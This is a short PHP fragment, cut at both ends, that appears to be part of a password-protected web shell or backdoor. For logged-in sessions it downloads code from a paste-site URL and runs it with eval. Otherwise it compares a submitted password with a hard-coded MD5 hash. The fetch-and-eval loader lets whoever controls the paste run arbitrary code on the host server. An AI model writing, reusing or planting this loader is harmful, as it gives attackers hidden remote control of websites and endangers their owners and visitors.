...
if (is_logged_in()) {
    ...
    $a = geturlsinfo('https://paste.phyo186.cfd/52Pl6-6klLe/raw');
    eval('?>' . $a);
} else {
    // Display login form if not logged in
    if (isset($_POST['password'])) {
        $entered_password = $_POST['password'];
        $hashed_password = 'aa4b3a9b07cceace275572f0ff15b183'; // Replace this with your MD5 hashed password
